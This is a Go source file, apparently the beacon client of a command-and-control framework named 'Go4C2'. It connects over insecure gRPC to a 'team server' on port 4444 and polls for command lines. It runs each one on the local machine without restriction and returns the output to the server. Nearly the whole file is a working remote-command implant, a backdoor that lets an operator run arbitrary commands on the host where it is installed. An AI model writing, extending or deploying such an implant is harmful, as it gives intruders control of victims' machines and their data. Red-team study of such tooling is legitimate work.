package main

import (
	"Go4C2/grpcapi"
	"context"
	"fmt"
	"log"
	"os/exec"
	"strings"
	"time"

	"google.golang.org/grpc"
)

var (
	g_strTeamServer     = "localhost"
	g_nBeaconServerPort = 4444
)

func main() {
	var (
		conn         *grpc.ClientConn
		err          error
		beaconClient grpcapi.BeaconClient
		grpcCmd      *grpcapi.Command
	)

	// 1. connect to the team server
	server := fmt.Sprintf("%s:%d", g_strTeamServer, g_nBeaconServerPort)
	conn, err = grpc.Dial(server, grpc.WithInsecure())
	if nil != err {
		log.Fatalf("grpc.Dial error: %v", err)
	}

	// 2. init client
	beaconClient = grpcapi.NewBeaconClient(conn)

	// begin polling
	context := context.Background()
	for {
		req := new(grpcapi.Empty)
		grpcCmd, err = beaconClient.FetchCommand(context, req)
		if err != nil {
			log.Fatalf("beaconClient.FetchCommand: %v", err)
		}

		if "" == grpcCmd.In {
			// no work
			log.Print("no work")
			time.Sleep(3 * time.Second)
			continue
		} else if "q" == grpcCmd.In {
			break
		}
		// execute the cmdline from team server
		var cmd *exec.Cmd
		cmds := strings.Split(grpcCmd.In, " ")
		if 1 == len(cmds) {
			cmd = exec.Command(cmds[0])
		} else {
			cmd = exec.Command(cmds[0], cmds[1:]...)
		}

		var arrBytesRes []byte
		arrBytesRes, err = cmd.CombinedOutput()
		if nil != err {
			grpcCmd.Out = err.Error()
		}
		grpcCmd.Out += string(arrBytesRes)
		beaconClient.SendResult(context, grpcCmd)
		log.Printf("response: %s", grpcCmd.Out)

	}
}
